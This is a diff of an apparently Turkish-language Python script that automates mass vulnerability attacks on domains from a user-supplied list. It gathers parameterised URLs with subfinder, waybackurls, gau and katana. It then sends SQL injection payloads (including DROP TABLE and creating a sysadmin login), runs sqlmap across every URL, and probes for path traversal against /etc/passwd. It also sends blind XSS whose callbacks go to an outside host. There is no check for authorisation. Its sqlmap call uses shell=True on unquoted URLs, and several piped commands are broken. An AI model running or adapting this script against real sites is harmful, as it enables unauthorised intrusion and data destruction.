@@ -15,22 +15,28 @@ def print_banner():
     """
     print(banner)
 
-# Banner'ı yazdır
 print_banner()
 
-# Kullanıcıdan domain dosyasının adını al
 liste = input("Lütfen domain dosyasının adını girin: ")
 
-# Dork listesi isteğe bağlı olarak alınır
 dork = input("Dork Linkleri Listesi Girin (isteğe bağlı, boş bırakabilirsiniz): ")
 
-# Subdomainleri al
-subdomains = subprocess.check_output(["subfinder", "-dL", liste]).decode().splitlines()
+try:
+    subfinder_output = subprocess.check_output(["subfinder", "-dL", liste]).decode()
+    subdomains = subfinder_output.splitlines()
+except subprocess.CalledProcessError as e:
+    print(f"[-] Hata: Subfinder çalıştırılırken bir hata oluştu: {e}")
+    exit()
 
 # Waybackurls ve grep kullanarak parametreli URL'leri çıkar ve httpx ile test edilir
 parameters = []
 for subdomain in subdomains:
-    wayback_output = subprocess.check_output(["waybackurls", subdomain]).decode()
+    try:
+        wayback_output = subprocess.check_output(["waybackurls", subdomain]).decode()
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Hata: Waybackurls çalıştırılırken bir hata oluştu ({subdomain}): {e}")
+        continue
+    
     for line in wayback_output.splitlines():
         if "?" in line:
             parameters.append(line)
@@ -43,73 +49,32 @@ if dork:
 
 # Parametreleri parameters.txt'ye yaz
 with open("parameters.txt", "w") as f:
-    f.write("\n".join(parameters))
+    for parameter in parameters:
+        f.write(parameter + "\n")
 
+with open("parameters.txt", "r") as f:
+    urls = f.read().splitlines()
 
-# SQL Injection payload'ları
-payloads = [
-    "' OR 1=1--",
-    "' OR '1'='1'; --",
-    "'; DROP TABLE users; --",
-    "' UNION SELECT 1,2,3 --",
-    "' UNION SELECT NULL, @@version, NULL --",
-    "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns WHERE table_schema=database() --",
-    "'XOR(if(now()=sysdate(),sleep(6),0))XOR'",
-    "'cybertix'; waitfor delay '0:0:8' --",
-    "test');CREATE LOGIN [DENEME] WITH PASSWORD=N'Password1';ALTER SERVER ROLE [sysadmin] ADD MEMBER [DENEME];select 1;--"
-]
-
-# Anahtar kelimeler
-keywords = [
-    "Error Executing Database Query",
-    "mysql_num_rows()",
-    "SQL syntax error",
-    "Database Error",
-    "SQL Error",
-    "Server Error",
-    "Warning: mysql_fetch_array()"
-]
-
-# Sonuç dosyası
-positive_results = "positive_results.txt"
-
-# SQL Injection kontrolü
-def check_sql_injection(url):
-    for payload in payloads:
-        url_with_payload = url + payload
-        try:
-            response = requests.get(url_with_payload, timeout=5)
-            if response.status_code == 200:
-                print(f"[+] Potansiyel SQL Injection Tespit Edildi: {url_with_payload}")
-                with open(positive_results, "a") as f:
-                    f.write(url_with_payload + "\n")
-        except requests.RequestException:
-            pass
-
-# Anahtar kelime kontrolü
-def check_keywords(url):
+# Her URL için sqlmap komutunu çalıştır
+sqlmap_results = ""
+for url in urls:
+    sqlmap_command = f"sqlmap --technique=T --batch -u \"{url}\""
     try:
-        response = requests.get(url)
-        for keyword in keywords:
-            if keyword in response.text:
-                print(f"[+] Anahtar Kelime Bulundu: {url} - Anahtar Kelime: {keyword}")
-                with open(positive_results, "a") as f:
-                    f.write(f"{url} - Anahtar Kelime: {keyword}\n")
-    except requests.RequestException:
-        pass
+        # subprocess.run ile komutu çalıştır
+        result = subprocess.run(sqlmap_command, shell=True, check=True, capture_output=True, text=True)
+        sqlmap_results += f"SQLMap Çıktısı ({url}):\n\n{result.stdout}\n\n"
+    except subprocess.CalledProcessError as e:
+        sqlmap_results += f"Hata oluştu: {e}\n"
 
-# Ana döngü
-for url in parameters:
-    print(f"[*] URL: {url}")
-    check_sql_injection(url)
-    check_keywords(url)
-    print("[*] Tarama Tamamlandı.")
+# Sonuçları bir dosyaya kaydet
+with open("sqlmap_results.txt", "w") as f:
+    f.write(sqlmap_results)
 
 # Subfinder komutunu çalıştır ve çıktısını domain.txt dosyasına kaydet
 subprocess.run(["subfinder", "-dL", liste, "-o", "domain.txt"])
 
 # httpx komutunu çalıştır ve çıktısını httpx.txt dosyasına kaydet
-subprocess.run(["httpx", "-l", "domain.txt", "-o", "httpx.txt"])
+httpx_output = subprocess.check_output(["httpx", "-l", "domain.txt"]).decode()
 
 # Gau komutu ile endpointleri al ve Endpoints.txt dosyasına kaydet
 gau_output = subprocess.check_output(["gau", "--threads", "5"] + subdomains).decode()
@@ -117,7 +82,7 @@ with open("Endpoints.txt", "w") as f:
     f.write(gau_output)
 
 # Katana komutu ile endpointleri al ve Endpoints.txt dosyasına ekle
-katana_output = subprocess.check_output(["katana", "-jc"] + httpx_output).decode()
+katana_output = subprocess.check_output(["katana", "-jc"] + httpx_output.splitlines()).decode()
 with open("Endpoints.txt", "a") as f:
     f.write(katana_output)
 
@@ -181,7 +146,6 @@ print("[+] SQL Enjeksiyonu Taraması 5 Başladı...")
 sql5_output = subprocess.check_output(["httpx", "-silent", "-H", "X-Forwarded-For: '; waitfor delay '0:0:6' -- ", "-rt", "-timeout", "20", "-mrt", ">13", "-o", "sql5.txt"], input="\n".join(parameters).encode()).decode()
 print("[+] SQL Enjeksiyonu Taraması 5 Tamamlandı.")
 
-# SQL Enjeksiyonu Taraması 6
 print("[+] SQL Enjeksiyonu Taraması 6 Başladı...")
 parameters_http_output = subprocess.check_output(["grep", "-v", "-e", "js", "-e", "css", "-e", "svg", "-e", "png", "-e", "jpg", "-e", "eot", "-e", "ttf", "-e", "woff"] + ["httpx", "-mc", "200", "-silent"], input="\n".join(parameters).encode()).decode()
 with open("parameters_http.txt", "w") as f:
@@ -192,12 +156,12 @@ with open("sql6.txt", "w") as f:
     f.write(sql6_output)
 print("[+] SQL Enjeksiyonu Taraması 6 Tamamlandı.")
 
-# Path Traversal Kontrolü
+
 print("[+] Path Traversal Kontrolü Başladı...")
 path_traversal_output = subprocess.check_output(["httpx", "-l", "parameters.txt", "-path", "'///////../../../../../../etc/passwd'", "-status-code", "-mc", "200", "-ms", "'root:'", "-o", "path_traversal.txt"]).decode()
 print("[+] Path Traversal Kontrolü Tamamlandı.")
 
-# Gospider Kontrolü
+
 print("[+] Gospider Kontrolü Başladı...")
 gospider_output = subprocess.check_output(["gospider", "-S", "httpx_results.txt", "-c", "10", "-d", "5", "--blacklist", "'.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)'", "--other-source"], input="\n".join(subdomains).encode()).decode()
 result_output = subprocess.check_output(["grep", "-e", "code-200", "|", "awk", "'{print $5}'", "|", "grep", "=", "|", "qsreplace", "-a", "|", "dalfox", "pipe"]).decode()
@@ -205,22 +169,22 @@ with open("result.txt", "w") as f:
     f.write(result_output)
 print("[+] Gospider Kontrolü Tamamlandı.")
 
-# SQL Enjeksiyonu Taraması 7
+
 print("[+] SQL Enjeksiyonu Taraması 7 Başladı...")
 blindsqli_output = subprocess.check_output(["grep", "="] + ["qsreplace", "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"], input="\n".join(parameters).encode()).decode()
 with open("blindsqli.txt", "w") as f:
     f.write(blindsqli_output)
 print("[+] SQL Enjeksiyonu Taraması 7 Tamamlandı.")
 
-# XSS Kontrolü 3
+
 print("[+] XSS Kontrolü 3 Başladı...")
 xss3_output = subprocess.check_output(["getJS", "|", "httpx", "--match-regex", "addEventListener\((?:\\'|\\\")(message)(?:\\'|\\\")", "-silent"]).decode()
 with open("xss3.txt", "w") as f:
     f.write(xss3_output)
 print("[+] XSS Kontrolü 3 Tamamlandı.")
 
-# XSS Taraması
 print("[+] XSS Taraması başlandı..")
+xss_taramasi_output = ""
 with open(liste, "r") as f:
     sites = f.readlines()
     for site in sites:
@@ -230,32 +194,34 @@ with open(liste, "r") as f:
             if line.startswith("https://") and "=" in line:
                 uro_output = subprocess.check_output(["uro"], input=line.encode()).decode()
                 dalfox_output = subprocess.check_output(["dalfox", "pipe", "--deep-domxss", "--multicast", "--blind", "https://chirag.bxss.in"], input=uro_output.encode()).decode()
-                with open("XSS_yeni.txt", "a") as f:
-                    f.write(dalfox_output)
+                xss_taramasi_output += dalfox_output  # XSS taraması sonucunu değişkene ekle
 print("[+] XSS Taraması bitti..")
 
-# Sonuçları yazdırmak için bir döngü kullanarak işlem sonuçlarını dosyaya yazma
-with open("all_result.txt", "w") as f:
-    tasks = [
-        ("SQL Enjeksiyonu Taraması 2 Sonuçları", sql1_output),
-        ("Fuzzing Kontrolü Sonuçları", nuclei_output),
-        ("template Kontrolü Sonuçları", nuclei_output2),
-        ("SQL Enjeksiyonu Taraması 3 Sonuçları", sql3_output),
-        ("HTTP API Kontrolü Sonuçları", public_output),
-        ("LFI Kontrolü Sonuçları", lfi_output),
-        ("XSS Kontrolü 2 Sonuçları", xss2_output),
-        ("SQL Enjeksiyonu Taraması 5 Sonuçları", sql5_output),
-        ("SQL Enjeksiyonu Taraması 6 Sonuçları", sql6_output),
-        ("SQL Enjeksiyonu Taraması 7 Sonuçları", blindsqli_output),
-        ("Path Traversal Kontrolü Sonuçları", path_traversal_output),
-        ("Gospider Kontrolü Sonuçları", gospider_output),
-        ("XSS Kontrolü 3 Sonuçları", xss3_output),
-        ("XSS Taraması Sonuçları", xss_taramasi_output),
-        ("Tüm Sonuçlar", all_results)
-    ]
 
-    for task_name, task_output in tasks:
+with open("all_result.txt", "w") as f:
+     tasks = [
+    ("SQL Enjeksiyonu Taraması 2 Sonuçları", sql1_output, "parameters.txt"),
+    ("Fuzzing Kontrolü Sonuçları", nuclei_output, "parameters.txt"),
+    ("template Kontrolü Sonuçları", nuclei_output2, "parameters.txt"),
+    ("SQL Enjeksiyonu Taraması 3 Sonuçları", sql3_output, "parameters.txt"),
+    ("HTTP API Kontrolü Sonuçları", public_output, "parameters.txt"),
+    ("LFI Kontrolü Sonuçları", lfi_output, "domain.txt"),
+    ("XSS Kontrolü 2 Sonuçları", xss2_output, "parameters.txt"),
+    ("SQL Enjeksiyonu Taraması 5 Sonuçları", sql5_output, "parameters.txt"),
+    ("SQL Enjeksiyonu Taraması 6 Sonuçları", sql6_output, "parameters.txt"),
+    ("SQL Enjeksiyonu Taraması 7 Sonuçları", blindsqli_output, "parameters.txt"),
+    ("Path Traversal Kontrolü Sonuçları", path_traversal_output, "parameters.txt"),
+    ("Gospider Kontrolü Sonuçları", gospider_output, "domain.txt"),
+    ("XSS Kontrolü 3 Sonuçları", xss3_output, "parameters.txt"),
+    ("XSS Taraması Sonuçları", xss_taramasi_output, "domain.txt"),
+    ("Tüm Sonuçlar", all_results, "parameters.txt"),
+    ("SQLMap Sonuçları", sqlmap_results, "parameters.txt")  # Yeni task eklendi
+]  
+
+with open("all_result.txt", "w") as f:
+    for task_name, task_output, task_list in tasks:
         f.write("##########################################################\n")
-        f.write(f"[+] {task_name}:\n")
+        f.write(f"[+] {task_name} ({task_list}):\n")
         f.write("##########################################################\n")
         f.write(f"{task_output}\n\n")
+
